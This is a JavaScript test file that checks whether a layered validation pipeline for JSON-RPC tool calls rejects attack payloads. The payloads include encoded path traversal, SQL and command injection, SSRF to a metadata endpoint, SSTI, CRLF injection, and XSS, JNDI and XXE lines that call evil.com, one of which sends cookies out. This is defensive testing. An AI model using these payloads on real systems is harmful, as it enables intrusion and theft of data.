import { describe, it, expect, beforeEach } from 'vitest';
import { ValidationPipeline } from '@/security/utils/validation-pipeline.js';
import StructureValidationLayer from '@/security/layers/layer1-structure.js';
import ContentValidationLayer from '@/security/layers/layer2-content.js';
import BehaviorValidationLayer from '@/security/layers/layer3-behavior.js';

/**
 * Multi-Layer Integration Tests
 * Tests for defense-in-depth validation across the full pipeline
 * Validates attack evasion attempts across layer boundaries
 */

describe('Multi-Layer Pipeline Integration', () => {
  let pipeline;
  let layer1;
  let layer2;
  let layer3;

  beforeEach(() => {
    layer1 = new StructureValidationLayer({ debugMode: false });
    layer2 = new ContentValidationLayer({ debugMode: false });
    layer3 = new BehaviorValidationLayer({
      debugMode: false,
      rateLimiting: { maxRequestsPerMinute: 100 }
    });
    pipeline = new ValidationPipeline([layer1, layer2, layer3]);
  });

  describe('Multi-Encoding Evasion Attempts', () => {
    it('should catch triple-encoded path traversal', async () => {
      // Triple URL encoding: ../../etc/passwd
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'file-reader',
          arguments: {
            path: '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
      expect(result.allowed).toBe(false);
    });

    it('should catch mixed encoding path traversal', async () => {
      // Mix of URL encoding, Unicode, and raw
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'file-reader',
          arguments: {
            path: '.%2e/%2e./etc/passwd'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch Unicode fullwidth evasion of SQL injection', async () => {
      // Using fullwidth characters for SQL keywords
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'database-query',
          arguments: {
            query: "' \uFF35\uFF2E\uFF29\uFF2F\uFF2E \uFF33\uFF25\uFF2C\uFF25\uFF23\uFF34 * FROM users --"
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch hex-encoded XSS', async () => {
      // Hex-encoded script tag
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'html-renderer',
          arguments: {
            content: '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Combined Attack Vectors', () => {
    it('should catch SQL injection with path traversal', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'multi-tool',
          arguments: {
            path: '../../../var/log/app.log',
            query: "'; DROP TABLE users; --"
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch command injection embedded in XSS', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'web-tool',
          arguments: {
            content: '<img src="x" onerror="$(\\`whoami\\`)"/>'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch SSRF in prototype pollution attempt', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'json-handler',
          arguments: {
            data: '{"__proto__": {"url": "http://169.254.169.254/latest/meta-data/"}}'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Layer Bypass Attempts', () => {
    it('should fail at correct layer for structure issues', async () => {
      // Invalid JSON-RPC structure
      const message = {
        method: 'tools/call',
        id: 1
        // Missing jsonrpc version
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
      expect(result.layerName).toMatch(/structure/i);
    });

    it('should fail at Layer 2 for content with valid structure', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'test-tool',
          arguments: {
            path: '../../../etc/passwd'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
      expect(result.layerName).toMatch(/content/i);
    });

    it('should catch attack that tries to bypass content check via structure', async () => {
      // Valid structure but malicious content in unexpected field
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: '; DROP TABLE users; --', // Attack in ID field
        params: {
          name: 'safe-tool',
          arguments: {}
        }
      };

      const result = await pipeline.validate(message, {});

      // Should fail at structure (ID must be number/string without injection)
      // or content layer
      expect(result.passed).toBe(false);
    });
  });

  describe('Defense in Depth Validation', () => {
    it('should validate all clean messages pass all layers', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'calculator',
          arguments: {
            a: 10,
            b: 20,
            operation: 'add'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(true);
      expect(result.allowed).toBe(true);
    });

    it('should handle notifications without attacks', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'notifications/progress',
        params: {
          progressToken: 'token123',
          progress: 50,
          total: 100
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(true);
    });

    it('should catch malicious notification content', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'notifications/message',
        params: {
          message: '<script>document.location="http://evil.com?c="+document.cookie</script>'
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Complex Real-World Attack Patterns', () => {
    it('should catch Log4Shell-style JNDI injection', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'logger',
          arguments: {
            message: '${jndi:ldap://evil.com/exploit}'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch polyglot XSS/SQLi attack', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'search',
          arguments: {
            query: "'-alert(1)-'--><script>alert(1)</script>"
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch blind XXE attempt', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'xml-parser',
          arguments: {
            xml: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch SSTI (Server-Side Template Injection)', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'template-renderer',
          arguments: {
            template: '{{constructor.constructor("return this")()}}'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should catch CRLF injection attempt', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'http-client',
          arguments: {
            header: 'X-Custom: value\r\nSet-Cookie: admin=true'
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Edge Cases', () => {
    it('should handle null message gracefully', async () => {
      // The pipeline may throw or return failure - both are acceptable
      // as long as the attack doesn't succeed
      const result = await pipeline.validate(null, {}).catch(() => ({ passed: false, caught: true }));
      expect(result.passed).toBe(false);
    });

    it('should handle undefined message gracefully', async () => {
      const result = await pipeline.validate(undefined, {}).catch(() => ({ passed: false, caught: true }));
      expect(result.passed).toBe(false);
    });

    it('should handle empty object message', async () => {
      const result = await pipeline.validate({}, {});

      expect(result.passed).toBe(false);
    });

    it('should handle deeply nested malicious content', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'nested-tool',
          arguments: {
            level1: {
              level2: {
                level3: {
                  level4: {
                    attack: '../../../etc/passwd'
                  }
                }
              }
            }
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should handle array with mixed clean and malicious content', async () => {
      const message = {
        jsonrpc: '2.0',
        method: 'tools/call',
        id: 1,
        params: {
          name: 'batch-processor',
          arguments: {
            items: [
              'clean-item-1',
              'clean-item-2',
              '../../../etc/passwd',
              'clean-item-3'
            ]
          }
        }
      };

      const result = await pipeline.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Pipeline Layer Ordering', () => {
    it('should process layers in correct order', () => {
      const layerNames = pipeline.getLayers();

      expect(layerNames.length).toBe(3);
      expect(layerNames[0]).toMatch(/structure/i);
      expect(layerNames[1]).toMatch(/content/i);
      expect(layerNames[2]).toMatch(/behavior/i);
    });

    it('should allow adding layers dynamically', () => {
      const initialCount = pipeline.getLayers().length;

      const newLayer = new ContentValidationLayer({ debugMode: false });
      pipeline.addLayer(newLayer);

      expect(pipeline.getLayers().length).toBe(initialCount + 1);
    });
  });
});
